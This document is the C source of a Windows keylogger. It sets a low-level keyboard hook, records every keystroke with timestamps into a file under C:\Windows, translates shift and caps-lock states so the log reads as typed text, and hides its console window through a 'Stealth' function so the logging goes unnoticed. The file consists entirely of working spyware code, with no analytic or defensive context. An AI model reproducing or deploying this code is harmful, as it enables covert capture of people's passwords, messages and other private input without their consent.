
#include<stdio.h>
#include<windows.h>
#include<time.h>
#include<string.h>

time_t t;
struct tm tmstruct;
char DateTime0[21];
char DateTime1[21];
char *StringMask[2];

FILE *fp; // pointer to file to be written to

void openfile()
{
	fp = fopen("C:\\Windows\\keylog.txt", "a+");
	if(fp == NULL)
	{
		printf("Error with file.");
		exit(0);
	}
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
	
	time(&t);
	tmstruct = *localtime(&t);
	sprintf(DateTime1, "[%d-%d-%d : %d:%d] ", tmstruct.tm_mday, tmstruct.tm_mon+1, tmstruct.tm_year+1900, tmstruct.tm_hour, tmstruct.tm_min);
	if(strcmp(DateTime0, DateTime1) == 0)
	{
		StringMask[0] = "";
		StringMask[1] = "";
	}
	else
	{
		StringMask[0] = "\n";
		StringMask[1] = DateTime1;
		memcpy(DateTime0, DateTime1, sizeof DateTime0); // copies DateTime1's contents into DateTime0
	}
	// if key is being pressed...
	if (wParam == WM_KEYDOWN)
	{
		
		switch (p->vkCode) // -> is arrow operator which accesses vkCode which is a member of structure p which is a pointer to a structure
		{
			// invisible keys
			case VK_RETURN:		openfile();	fprintf(fp, "%s%s[ENTER]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_SPACE:		openfile();	fprintf(fp, "%s%s[SPACE]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_ESCAPE:		openfile();	fprintf(fp, "%s%s[ESC]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_TAB:		openfile();	fprintf(fp, "%s%s[TAB]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_CAPITAL:	openfile();	fprintf(fp, "%s%s[CAPS]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_NUMLOCK:	openfile();	fprintf(fp, "%s%s[NUM]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_SCROLL:		openfile();	fprintf(fp, "%s%s[SCROLL]", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_LSHIFT:		openfile();	fprintf(fp, "%s%s[LSHIFT]", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_RSHIFT:		openfile();	fprintf(fp, "%s%s[RSHIFT]", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_LCONTROL:	openfile();	fprintf(fp, "%s%s[LCTRL]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_RCONTROL:	openfile();	fprintf(fp, "%s%s[RCTRL]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_LWIN:		openfile();	fprintf(fp, "%s%s[LWIN]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_RWIN:		openfile();	fprintf(fp, "%s%s[RWIN]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_APPS:		openfile();	fprintf(fp, "%s%s[APPS]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_INSERT:		openfile();	fprintf(fp, "%s%s[INS]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_PRIOR:		openfile();	fprintf(fp, "%s%s[PGUP]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_NEXT:		openfile();	fprintf(fp, "%s%s[PGDOWN]", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_HOME:		openfile();	fprintf(fp, "%s%s[HOME]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_END:		openfile();	fprintf(fp, "%s%s[END]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_PAUSE:		openfile();	fprintf(fp, "%s%s[PAUSE]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_CANCEL:		openfile();	fprintf(fp, "%s%s[BREAK]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_LMENU:		openfile();	fprintf(fp, "%s%s[LALT]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_SNAPSHOT:	openfile();	fprintf(fp, "%s%s[PRINTSCN]", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_DELETE:		openfile();	fprintf(fp, "%s%s[DEL]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_BACK:		openfile();	fprintf(fp, "%s%s[BKSP]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_LEFT:		openfile();	fprintf(fp, "%s%s[LEFT]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_RIGHT:		openfile();	fprintf(fp, "%s%s[RIGHT]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_UP:			openfile();	fprintf(fp, "%s%s[UP]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_DOWN:		openfile();	fprintf(fp, "%s%s[DOWN]", StringMask[0], StringMask[1]);		fclose(fp);	break;
			case VK_NUMPAD0:	openfile();	fprintf(fp, "%s%s0", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD1:	openfile();	fprintf(fp, "%s%s1", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD2:	openfile();	fprintf(fp, "%s%s2", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD3:	openfile();	fprintf(fp, "%s%s3", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD4:	openfile();	fprintf(fp, "%s%s4", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD5:	openfile();	fprintf(fp, "%s%s5", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD6:	openfile();	fprintf(fp, "%s%s6", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD7:	openfile();	fprintf(fp, "%s%s7", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD8:	openfile();	fprintf(fp, "%s%s8", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_NUMPAD9:	openfile();	fprintf(fp, "%s%s9", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_MULTIPLY:	openfile();	fprintf(fp, "%s%s*", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_ADD:		openfile();	fprintf(fp, "%s%s+", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_SUBTRACT:	openfile();	fprintf(fp, "%s%s-", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_DECIMAL:	openfile();	fprintf(fp, "%s%s.", StringMask[0], StringMask[1]);			fclose(fp);	break;
			case VK_DIVIDE:		openfile();	fprintf(fp, "%s%s/", StringMask[0], StringMask[1]);			fclose(fp);	break;
			//case VK_SEPARATOR:	openfile();	fprintf(fp, "%s%s|");			fclose(fp);	break;
			case VK_OEM_PERIOD:	openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s.", StringMask[0], StringMask[1]): fprintf(fp, "%s%s>", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_COMMA:	openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s,", StringMask[0], StringMask[1]): fprintf(fp, "%s%s<", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_PLUS:	openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s=", StringMask[0], StringMask[1]): fprintf(fp, "%s%s+", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_MINUS:	openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s-", StringMask[0], StringMask[1]): fprintf(fp, "%s%s_", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_1:		openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s;", StringMask[0], StringMask[1]): fprintf(fp, "%s%s:", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_2:		openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s/", StringMask[0], StringMask[1]): fprintf(fp, "%s%s?", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_3:		openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s`", StringMask[0], StringMask[1]): fprintf(fp, "%s%s~", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_4:		openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s[", StringMask[0], StringMask[1]): fprintf(fp, "%s%s{", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_5:		openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s\\", StringMask[0], StringMask[1]): fprintf(fp, "%s%s|", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_6:		openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s]", StringMask[0], StringMask[1]): fprintf(fp, "%s%s}", StringMask[0], StringMask[1]);	fclose(fp);	break;
			case VK_OEM_7:		openfile();	((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s'", StringMask[0], StringMask[1]): fprintf(fp, "%s%s\"", StringMask[0], StringMask[1]);	fclose(fp);	break;
			// visible keys
			default:
				openfile();
				//fprintf(fp, "%s", byte_to_binary(GetKeyState(VK_CAPITAL)));
				if((p->vkCode) >= 65 && (p->vkCode) <= 90) // processing for alphabets (which have ASCII and vkCodes between 65 and 90)
				{
					if((GetKeyState(VK_CAPITAL) & 0x01) == 0) // check if CAPSLOCK is untoggled
						((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s%c", StringMask[0], StringMask[1], (p->vkCode)+32) : fprintf(fp, "%s%s%c", StringMask[0], StringMask[1], p->vkCode); // check if one of the shifts are also pressed
					else if((GetKeyState(VK_CAPITAL) & 0x01) == 1) // check if CAPSLOCK is toggled
						((GetKeyState(VK_SHIFT) & 32768) == 0) ? fprintf(fp, "%s%s%c", StringMask[0], StringMask[1], p->vkCode) : fprintf(fp, "%s%s%c", StringMask[0], StringMask[1], (p->vkCode)+32); // check is one of the shifts are also pressed
				}
				else if((p->vkCode) >= 48 && (p->vkCode) <= 57) // processing for Top-Row Number Keys (which have ASCII and vkCodes between 48 and 57)
				{
					if((GetKeyState(VK_SHIFT) & 32768) == 0) // check if one of the SHIFT keys are being held
						fprintf(fp, "%c", p->vkCode);
					else
					{
						char TRNumShifted[10] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
						fprintf(fp, "%s%s%c", StringMask[0], StringMask[1], TRNumShifted[(p->vkCode)-48]);
					}
				}
				else if((p->vkCode) >= 112 && (p->vkCode) <= 135) // processing for Functions keys
				{
					byte FunctionKeys[24] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24}; // 24 function keys
					fprintf(fp, "%s%s[F%d]", StringMask[0], StringMask[1], FunctionKeys[(p->vkCode)-112]);
				}
				else // this is a catch-all section which registers all unrecognised keys not part of a standard keyboard
					fprintf(fp, "%s%s[%d]", StringMask[0], StringMask[1], (p->vkCode));
				fclose(fp);
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Stealth() {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}

int main()
{
	time(&t); // calculate current time and encode it into time_t format
	tmstruct = *localtime(&t); // breakup value in t into structure tmstruct whose members give day, month, year, hour and minute
	sprintf(DateTime0, "[%d-%d-%d : %d:%d] ", tmstruct.tm_mday, tmstruct.tm_mon+1, tmstruct.tm_year+1900, tmstruct.tm_hour, tmstruct.tm_min); // save date and time data into DateTime0 string
	openfile(); fprintf(fp, "#############"); fprintf(fp, "\n# KeyLogger #"); fprintf(fp, "\n#############"); fprintf(fp, "\n%s", DateTime0); fclose(fp);
	Stealth(); // this hides the console window which opens when the program is launched
	// setting up Windows Keyboard Hook
	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);

	// creates a waiting state which prevents the KeyLogger program from exiting main()
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)){}
	return(0);
}